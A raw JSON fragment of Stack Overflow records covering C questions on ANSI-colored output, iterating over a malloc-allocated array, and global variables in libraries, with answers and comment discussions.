false, "score": 0, "creation_date": 1459357668, "post_id": 36315031, "comment_id": 60254029, "body": "I can update it with a version for C, but it should be pretty clear to do in C. Make functions operating on char buffers and append and prepend the desired stuff."}, {"owner": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "reply_to_user": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "edited": false, "score": 0, "creation_date": 1459357778, "post_id": 36315031, "comment_id": 60254104, "body": "@BelalMedhat If you write a solution in C and upload an answer, I will remove mine and upvote yours"}, {"owner": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "edited": false, "score": 0, "creation_date": 1459357818, "post_id": 36315031, "comment_id": 60254121, "body": "Thank you, I did it in C, this is more than enough, Thank you for your help, this is amazing code."}, {"owner": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "edited": false, "score": 0, "creation_date": 1459357987, "post_id": 36315031, "comment_id": 60254247, "body": "No, my c code just use ansi c color codes to print text using colors in terminals and consoles, and I&#39;ve learned it from answers on stackoverflow, your code is very good and in C++."}, {"owner": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "reply_to_user": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "edited": false, "score": 0, "creation_date": 1459358153, "post_id": 36315031, "comment_id": 60254348, "body": "Just thought that the answer in here should be given in ANSI-C, since that was your question :-). I didn&#39;t print my C version, since I use some C99 features which are not available on Windows. We just leave it here, I will go get a pizza."}, {"owner": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "edited": false, "score": 0, "creation_date": 1459358628, "post_id": 36315031, "comment_id": 60254610, "body": "LOL Go and get pizza, i&#39;m happy that i met you, Thank you again."}], "tags": [], "owner": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "is_accepted": false, "score": 0, "last_activity_date": 1459356639, "creation_date": 1459356639, "answer_id": 36315031, "question_id": 36314690, "link": "https://stackoverflow.com/questions/36314690/c-fprintf-with-colors/36315031#36315031", "title": "C fprintf with colors", "body": "<p>I am using this solution, which is pretty neat if you are into streams and C++</p>\n\n<pre><code>#include &lt;cstdlib&gt;\n#include &lt;iostream&gt;\n#include &lt;sstream&gt;\n\nnamespace sps {\n  namespace colors {\n    enum color {\n      none    = 0x00,\n      black   = 0x01,\n      red     = 0x02,\n      green   = 0x03,\n      yellow  = 0x04,\n      blue    = 0x05,\n      magenta = 0x06,\n      cyan    = 0x07,\n      white   = 0x08\n    };\n  }\n  namespace faces {\n    enum face {\n      normal    = 0x00,\n      bold      = 0x01,\n      dark      = 0x02,\n      uline     = 0x04,\n      invert    = 0x07,\n      invisible = 0x08,\n      cline     = 0x09\n    };\n  }\n\n  /**\n   * Generate string for color codes for std::iostream's\n   *\n   * @param foreground\n   * @param background\n   *\n   * @return\n   *\n   * Usage:\n   *\n   * using namespace sps;\n   * std::cout &lt;&lt; \"These words should be colored [ \"\n   *           &lt;&lt; set_color(colors::red)   &lt;&lt; \"red \"\n   *           &lt;&lt; set_color(colors::green) &lt;&lt; \"green \"\n   *           &lt;&lt; set_color(colors::blue)  &lt;&lt; \"blue\"\n   *           &lt;&lt; set_color() &lt;&lt;  \" ]\" &lt;&lt; std::endl;\n   *\n   */\n  static inline std::string set_color(sps::colors::color foreground = sps::colors::none,\n                                      sps::colors::color background = sps::colors::none) {\n    std::stringstream s;\n    s &lt;&lt; \"\\033[\";\n    if (!foreground &amp;&amp; ! background){\n        s &lt;&lt; \"0\"; // reset colors if no params\n    }\n    if (foreground) {\n        s &lt;&lt; 29 + foreground;\n        if (background) s &lt;&lt; \";\";\n    }\n    if (background) {\n        s &lt;&lt; 39 + background;\n    }\n    s &lt;&lt; \"m\";\n    return s.str();\n  }\n\n  /**\n   *\n   *\n   * @param face\n   *\n   * @return\n   */\n  static inline std::string set_face(sps::faces::face face = sps::faces::normal) {\n    std::stringstream s;\n    s &lt;&lt; \"\\033[\";\n    if (!face) {\n        s &lt;&lt; \"0\"; // reset face\n    }\n    if (face) {\n      s &lt;&lt; face;\n    }\n    s &lt;&lt; \"m\";\n    return s.str();\n  }\n}\n\nint main(int agrc, char* argv[])\n{\n  using namespace sps;\n  std::cout &lt;&lt; \"These words should be colored [ \"\n        &lt;&lt; set_color(colors::red)   &lt;&lt; \"red \"\n        &lt;&lt; set_color(colors::green) &lt;&lt; \"green \"\n        &lt;&lt; set_color(colors::blue)  &lt;&lt; \"blue \"\n        &lt;&lt; set_color(colors::cyan)   &lt;&lt; \"cyan \"\n        &lt;&lt; set_color(colors::magenta) &lt;&lt; \"magenta \"\n        &lt;&lt; set_color(colors::yellow)  &lt;&lt; \"yellow\"\n        &lt;&lt; set_color() &lt;&lt;  \" ]\" &lt;&lt; std::endl;\n  return EXIT_SUCCESS;\n}\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 6135853, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-T_L3i2WVEh8/AAAAAAAAAAI/AAAAAAAAAB0/PBPv-txCsMY/photo.jpg?sz=128", "display_name": "Belal Medhat", "link": "https://stackoverflow.com/users/6135853/belal-medhat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2356, "favorite_count": 0, "accepted_answer_id": 36314984, "answer_count": 2, "score": 1, "last_activity_date": 1459356639, "creation_date": 1459355628, "question_id": 36314690, "link": "https://stackoverflow.com/questions/36314690/c-fprintf-with-colors", "title": "C fprintf with colors", "body": "<p>is there a way to print colored text to files using C programming language on Ubuntu Linux, you can use color codes with printf() and print colored text to console or terminal window, but how to print text to text files with colors?</p>\n"}, {"tags": ["c", "pointers", "malloc"], "comments": [{"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 1, "creation_date": 1459355437, "post_id": 36314571, "comment_id": 60252496, "body": "Are you trying to store five values or four values? Because if you want to use a sentinel to mark the end of an array, you need to allocate space for the sentinel. Also, you need an &quot;illegal&quot; value to use as the sentinel."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459355598, "post_id": 36314571, "comment_id": 60252613, "body": "So you have a problem writing a loop which iterates <b><code>5</code></b> times?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1459355685, "post_id": 36314571, "comment_id": 60252693, "body": "Strictly speaking you just allocate a piece of memory you treat like an array using a pointer to its first element. <code>int </code> is a pointer, not an array. You have to free this allocated block lateron using <b>the same</b> address you got from <code>malloc</code>, so you <b>must not</b> loose this address! Use another pointer to iterate."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459355954, "post_id": 36314571, "comment_id": 60252877, "body": "&quot;I want to knwo what happens in the examples I gave.&quot; That makes you question useless and changes its character completely. I feel tempted to rollback, as you are supposed not to change the question once you have answers. I&#39;ll leave it at &quot;unclear&quot;."}], "answers": [{"comments": [{"owner": {"reputation": 247, "user_id": 5661576, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/92ec48405b79536dcb523ed0a6db0af4?s=128&d=identicon&r=PG&f=1", "display_name": "SomeoneWithAQuestion", "link": "https://stackoverflow.com/users/5661576/someonewithaquestion"}, "edited": false, "score": 0, "creation_date": 1459355632, "post_id": 36314616, "comment_id": 60252646, "body": "I know. I&#39;m not looking to do that."}, {"owner": {"reputation": 79096, "user_id": 865874, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ACMnN.png?s=128&g=1", "display_name": "rodrigo", "link": "https://stackoverflow.com/users/865874/rodrigo"}, "reply_to_user": {"reputation": 247, "user_id": 5661576, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/92ec48405b79536dcb523ed0a6db0af4?s=128&d=identicon&r=PG&f=1", "display_name": "SomeoneWithAQuestion", "link": "https://stackoverflow.com/users/5661576/someonewithaquestion"}, "edited": false, "score": 0, "creation_date": 1459355692, "post_id": 36314616, "comment_id": 60252694, "body": "@SomeoneWithAQuestion: If what you want is to know the length of the array with just the pointer, then there is no such way in standard C."}], "tags": [], "owner": {"reputation": 79096, "user_id": 865874, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ACMnN.png?s=128&g=1", "display_name": "rodrigo", "link": "https://stackoverflow.com/users/865874/rodrigo"}, "is_accepted": false, "score": 1, "last_activity_date": 1459355632, "last_edit_date": 1459355632, "creation_date": 1459355447, "answer_id": 36314616, "question_id": 36314571, "link": "https://stackoverflow.com/questions/36314571/going-through-an-allocated-array/36314616#36314616", "title": "Going through an allocated array", "body": "<p>Arrays in C don't carry their length. You have to pass the length along with the array.</p>\n\n<p>The easiest way is with a variable:</p>\n\n<pre><code>int i;\nfor (i = 0; i &lt; 5; ++i)\n    printf(\"%d \", num[i]);\n</code></pre>\n\n<p>The trick with the ending <code>NUL</code> is normally used only for strings, the end of the string is marked with a <code>NUL</code> char (<code>'\\0'</code>). Naturally, if you are building and consuming the array yourself, nothing prevents you from making up a similar convention. You can, for instance, mark the end of the array with <code>-1</code>:</p>\n\n<pre><code>int *num = malloc(5 * sizeof(int));\nnum[4] = -1;\nint *p;\nfor (p = num; *p != -1; ++p)\n    printf(\"%d \", *p);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459355612, "post_id": 36314618, "comment_id": 60252630, "body": ".. or even more simple: <code>num[i]</code>. Why make it so difficult for a novice?"}, {"owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459355657, "post_id": 36314618, "comment_id": 60252673, "body": "@PaulOgilvie, True. Thanks. :)"}], "tags": [], "owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "is_accepted": false, "score": 1, "last_activity_date": 1459355646, "last_edit_date": 1459355646, "creation_date": 1459355454, "answer_id": 36314618, "question_id": 36314571, "link": "https://stackoverflow.com/questions/36314571/going-through-an-allocated-array/36314618#36314618", "title": "Going through an allocated array", "body": "<p>When you are using the allocated array in a way you are showing</p>\n\n<pre><code>int *num = malloc(5 * sizeof(int));\n</code></pre>\n\n<p>Then the only way to know the end is to use the size used to allocate the array. Like</p>\n\n<pre><code>int i = 0;\nwhile(i &lt; 5)  // 5 here is the size used wile allocating\n{\n   printf(\"%d\", num[i]);\n   i++;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459355815, "post_id": 36314698, "comment_id": 60252782, "body": "Wit this solution you lose the starting address of the memory allocated with <code>malloc</code>."}, {"owner": {"reputation": 247, "user_id": 5661576, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/92ec48405b79536dcb523ed0a6db0af4?s=128&d=identicon&r=PG&f=1", "display_name": "SomeoneWithAQuestion", "link": "https://stackoverflow.com/users/5661576/someonewithaquestion"}, "edited": false, "score": 0, "creation_date": 1459355884, "post_id": 36314698, "comment_id": 60252830, "body": "So something like: for (struct temp* current = array; current != NULL; current++) wouldn&#39;t work? (current != NULL is what I&#39;m addressing)"}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459355892, "post_id": 36314698, "comment_id": 60252837, "body": "@PaulOgilvie Sorry, with what solution?"}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459355956, "post_id": 36314698, "comment_id": 60252879, "body": "with <code>num++</code> in your solution as <code>num</code> holds the starting address of the allocated memory."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "reply_to_user": {"reputation": 247, "user_id": 5661576, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/92ec48405b79536dcb523ed0a6db0af4?s=128&d=identicon&r=PG&f=1", "display_name": "SomeoneWithAQuestion", "link": "https://stackoverflow.com/users/5661576/someonewithaquestion"}, "edited": false, "score": 0, "creation_date": 1459355958, "post_id": 36314698, "comment_id": 60252880, "body": "@SomeoneWithAQuestion Definitely not. Why would incrementing a valid pointer suddenly turn it into the special constant that marks an invalid pointer?"}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459355971, "post_id": 36314698, "comment_id": 60252892, "body": "@PaulOgilvie Sorry, what solution are you talking about? There isn&#39;t even a <code>malloc</code> anywhere in my answer."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459356066, "post_id": 36314698, "comment_id": 60252947, "body": "David, you posted an &quot;answer&quot; and I call and &quot;answer&quot; a &quot;solution&quot; to the question. And I am refering to the &quot;solution&quot; or &quot;answer&quot; or how you would like to call it, to which I am posting these comments."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459356107, "post_id": 36314698, "comment_id": 60252982, "body": "@PaulOgilvie I have no idea what you&#39;re talking about. These are code snippets and you seem to be assuming someone will connect them together incorrectly and that that&#39;s somehow a defect in my answer?!"}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459356193, "post_id": 36314698, "comment_id": 60253035, "body": "No, I mean that the question started with <code>int *num = malloc(5 * sizeof(int));</code> and if you now start doing <code>num++</code> you lose the starting adress of the memory allocated."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459356316, "post_id": 36314698, "comment_id": 60253122, "body": "@PaulOgilvie Right. Again, these are code snippets. One shows how <code>num</code> gets its value. The others show things you can do with that value. Another thing you can do with that value, not shown, is save it so that you can pass it to <code>free</code>. Yes, you can misuse these snippets, but any code can be misused. The snippets are, however, all correct."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459356485, "post_id": 36314698, "comment_id": 60253220, "body": "In my opinion your answer must fit with the question, using variables of the question and if using temporary variables is better, then declaring them and using them. A novice programmer may not understand from your snippets that the staring address is lost."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1459361531, "post_id": 36314698, "comment_id": 60256357, "body": "@PaulOgilvie That would just make the concepts I&#39;m trying to explain more difficult to understand. If I was trying to show how to free the allocated memory, you would have a point. But since I&#39;m not, I think you&#39;re just asking me to make the answer messier."}], "tags": [], "owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "is_accepted": false, "score": -1, "last_activity_date": 1459355663, "creation_date": 1459355663, "answer_id": 36314698, "question_id": 36314571, "link": "https://stackoverflow.com/questions/36314571/going-through-an-allocated-array/36314698#36314698", "title": "Going through an allocated array", "body": "<pre><code>while(*num) {\n   printf(\"%d\", *num);\n   num++;\n}\n</code></pre>\n\n<p>Well, this continues until <code>*num</code> is zero. This works fine if no valid entry can contain a zero and you have set the last entry (or the first invalid entry) to zero. This is called a sentinel value.</p>\n\n<pre><code>while(num != NULL) {\n       printf(\"%d\", *num);\n       num++;\n    }\n</code></pre>\n\n<p>This won't work. Incrementing <code>num</code> won't make make it <code>NULL</code>. Why would it?</p>\n\n<p>If you have some particular number of values you want to output, you have two basic choices. You can pass the number of values you want to output to the output code and just count as you output that number of values. Or you can use a \"sentinel\" value to mark the end. If zero is not a valid value you would ever want to print, you can use zero as a sentinel. Don't forget to allocate space for the sentinel.</p>\n"}, {"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1459357265, "post_id": 36314726, "comment_id": 60253757, "body": "An array should only contain sematically identical data. Using the first element for the size is a bad idea. Instead a <code>struct</code> with <i>flexible array member</i> should be used."}, {"owner": {"reputation": 3111, "user_id": 479941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ebad9df474aa1949c09ef5136e55fd33?s=128&d=identicon&r=PG", "display_name": "Mark Nunberg", "link": "https://stackoverflow.com/users/479941/mark-nunberg"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459357537, "post_id": 36314726, "comment_id": 60253932, "body": "My point was more to demonstrate how an &quot;array&quot; may physically contain more than just its members, and considering the OP seems fairly new at C, I deemed introducing flexible array members a bit too confusing. Not to mention true flexible array members can either be <code>[0]</code> or <code>[1]</code> depending on whether C99 or C89 is used..."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459358762, "post_id": 36314726, "comment_id": 60254681, "body": "FAMs are part of the C standard (too bad C11 made them optional, though). And the semantics are well defined (they have no size and the <code>struct</code> does not add 1 element. You might think of proprietary extensions like gcc zero-length arrays or single-element arrays accessing beyond the upper bound, which is actually UB. None of them is a FAM and should not be used anymore (gcc supports FAMs in standard mode)."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459358834, "post_id": 36314726, "comment_id": 60254718, "body": "Oh, and I think teaching a beginner bad style is the worse of both approaches. But there are alternatives, just use a second variable for the length or a pointer to a VLA, etc.; no need for a <code>struct</code> as a FAM requires."}], "tags": [], "owner": {"reputation": 3111, "user_id": 479941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ebad9df474aa1949c09ef5136e55fd33?s=128&d=identicon&r=PG", "display_name": "Mark Nunberg", "link": "https://stackoverflow.com/users/479941/mark-nunberg"}, "is_accepted": false, "score": 0, "last_activity_date": 1459357678, "last_edit_date": 1459357678, "creation_date": 1459355745, "answer_id": 36314726, "question_id": 36314571, "link": "https://stackoverflow.com/questions/36314571/going-through-an-allocated-array/36314726#36314726", "title": "Going through an allocated array", "body": "<p>You need to store the length of the array somewhere. Some other strategies are placing a <em>terminator</em> or <em>sentinel</em> value at the end of the array (though that value will not be valid for actual content):</p>\n\n<pre><code>int *num = calloc(6, sizeof(int));\nnum[5] = -1;\nint i;\nfor (i = 0; num[i] != -1; i++) {\n    //...\n}\n</code></pre>\n\n<p>Or embed the length of the array as its first element:</p>\n\n<pre><code>int *num = malloc(6 * sizeof(int));\nint len = num[0];\nint i;\nfor (i = 1; i &lt; len; i++) {\n    // ...\n}\n</code></pre>\n\n<p>(Note, <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Zero-Length.html\" rel=\"nofollow\">Flexible arrays</a> is a better way to express the second example)</p>\n\n<p>Both the above show how to store the length in the array itself, and make use of an extra element for this purpose.</p>\n"}], "owner": {"reputation": 247, "user_id": 5661576, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/92ec48405b79536dcb523ed0a6db0af4?s=128&d=identicon&r=PG&f=1", "display_name": "SomeoneWithAQuestion", "link": "https://stackoverflow.com/users/5661576/someonewithaquestion"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 0, "answer_count": 4, "score": 0, "last_activity_date": 1459357678, "creation_date": 1459355279, "last_edit_date": 1459355750, "question_id": 36314571, "link": "https://stackoverflow.com/questions/36314571/going-through-an-allocated-array", "title": "Going through an allocated array", "body": "<p>Let's say I wanna print the values of an array of type int.<Br></p>\n\n<pre><code>int *num = malloc(5 * sizeof(int));\n</code></pre>\n\n<p>How do I do that? I would obviously like to stop after I've gone through all the values I put, which there are 5 of them.<br><br></p>\n\n<p>Note that I'm not looking to do something like:</p>\n\n<pre><code>for (int i=0;i&lt;5;i++)\n</code></pre>\n\n<p>I want to knwo what happens in the examples I gave.<br><br></p>\n\n<pre><code>while(*num) {\n   printf(\"%d\", *num);\n   num++;\n}\n</code></pre>\n\n<p>OR</p>\n\n<pre><code>while(num != NULL) {\n       printf(\"%d\", *num);\n       num++;\n    }\n</code></pre>\n"}, {"tags": ["c", "global-variables", "static-libraries"], "comments": [{"owner": {"reputation": 2558, "user_id": 655436, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/98da4e7757d5f0e8596fd832bebee3d0?s=128&d=identicon&r=PG", "display_name": "fukanchik", "link": "https://stackoverflow.com/users/655436/fukanchik"}, "edited": false, "score": 0, "creation_date": 1459355149, "post_id": 36314426, "comment_id": 60252301, "body": "<a href=\"http://stackoverflow.com/questions/1164167/variable-declaration-in-a-header-file\" title=\"variable declaration in a header file\">stackoverflow.com/questions/1164167/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 1791, "user_id": 5022759, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hg0HA.png?s=128&g=1", "display_name": "ikrabbe", "link": "https://stackoverflow.com/users/5022759/ikrabbe"}, "is_accepted": false, "score": 0, "last_activity_date": 1459355133, "creation_date": 1459355133, "answer_id": 36314514, "question_id": 36314426, "link": "https://stackoverflow.com/questions/36314426/do-you-define-global-variables-in-a-c-library/36314514#36314514", "title": "Do you define global variables in a C library?", "body": "<p>The answer is yes and no. Yes you can declare global variables in a header file, but no you shouldn't declare global variables, especially when you want to deploy a library. Or at least choose the variables that are going to global space with great care and then try to rethink if they are really useful or if it would be better to hold variables in some context structures.</p>\n"}, {"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": 